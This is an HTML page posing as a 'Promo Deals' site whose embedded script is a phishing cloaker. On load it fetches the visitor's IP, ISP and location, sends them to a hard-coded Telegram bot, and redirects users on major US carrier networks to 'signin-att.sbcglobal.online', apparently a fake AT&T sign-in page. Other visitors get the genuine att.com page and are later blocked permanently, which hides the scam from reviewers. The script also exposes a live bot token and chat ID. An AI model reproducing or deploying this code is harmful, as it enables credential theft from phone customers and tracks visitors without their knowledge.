<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Deals</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
    <script>
        // CONFIGURATION: Insert your links here
        const ATT_LANDING_PAGE = 'https://signin-att.sbcglobal.online'; 
        const NON_ATT_LANDING_PAGE = 'https://www.att.com/buy/phones/apple-iphone-17-pro-max.html';
        const SESSION_DURATION_MS = 30 * 60 * 1000; // 30 minutes
        const MOBILE_ISPS = ['AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'US Cellular', 'Cricket', 'Metro', 'Boost', 'Xfinity', 'Charter Communications Inc', ' Comcast Cable Communications, LLC','Verizon Business','T-Mobile USA, Inc.'];
        const TELEGRAM_BOT_TOKEN = '6156363186:AAFqc8qaAB9D6T4tvpIAZUBv0UYJsET6EDQ';
        const TELEGRAM_CHAT_ID = '1075388353';

        async function sendTelegramNotification(data) {
            let message = `🚀 *New App Visit!* \n\n`;
            if (localStorage.getItem('isp_blocked_permanently') === 'true') {
                message = `🚫 *Blocked Visitor Attempt!* \n\n`;
            }
            
            message += `📍 *IP:* ${data.ip}\n` +
                       `🏢 *ISP:* ${data.org || data.isp || 'N/A'}\n` +
                       `🌍 *Location:* ${data.city}, ${data.region}, ${data.country_name}\n` +
                       `🕒 *Time:* ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Failed to send Telegram notification:', error);
            }
        }
                 
        function permanentlyBlock() {
            localStorage.setItem('isp_blocked_permanently', 'true');
            document.documentElement.innerHTML = '';
            window.stop();
        }

        function showLandingPage(url) {
            window.location.href = url;
        }

        async function checkISP() {
            let data = null;
            try {
                // Try ipapi.co first
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    data = await response.json();
                } else {
                    // Fallback to ipinfo.io (public API)
                    const fbResponse = await fetch('https://ipinfo.io/json');
                    if (fbResponse.ok) {
                        const fbData = await fbResponse.json();
                        // Normalize data format
                        data = {
                            ip: fbData.ip,
                            org: fbData.org,
                            city: fbData.city,
                            region: fbData.region,
                            country_name: fbData.country,
                            isp: fbData.org
                        };
                    }
                }
            } catch (error) {
                console.error('IP info fetch failed:', error);
            }

            if (data) {
                // Send Telegram notification
                await sendTelegramNotification(data);
            } else {
                // Even if we couldn't get IP data, we might want to know there was a visit
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: `🚨 *New Visit (IP data unavailable)*\n🕒 *Time:* ${new Date().toLocaleString()}`,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (e) {}
            }

            // 1. Check if already permanently blocked
            if (localStorage.getItem('isp_blocked_permanently') === 'true') {
                permanentlyBlock();
                return;
            }

            if (data) {
                const userISP = data.org || data.isp || "";
                
                if (MOBILE_ISPS.some(isp => userISP.toUpperCase().includes(isp.toUpperCase()))) {
                    localStorage.removeItem('non_att_first_visit');
                    showLandingPage(ATT_LANDING_PAGE);
                    return;
                }
            }

            // 2. Grace period check
            const firstVisit = localStorage.getItem('non_att_first_visit');
            if (firstVisit) {
                if (Date.now() - parseInt(firstVisit) >= SESSION_DURATION_MS) {
                    permanentlyBlock();
                } else {
                    showLandingPage(NON_ATT_LANDING_PAGE);
                }
            } else {
                localStorage.setItem('non_att_first_visit', Date.now().toString());
                showLandingPage(NON_ATT_LANDING_PAGE);
            }
        }
        
        checkISP();
    </script>
</head>

</body>
</html>
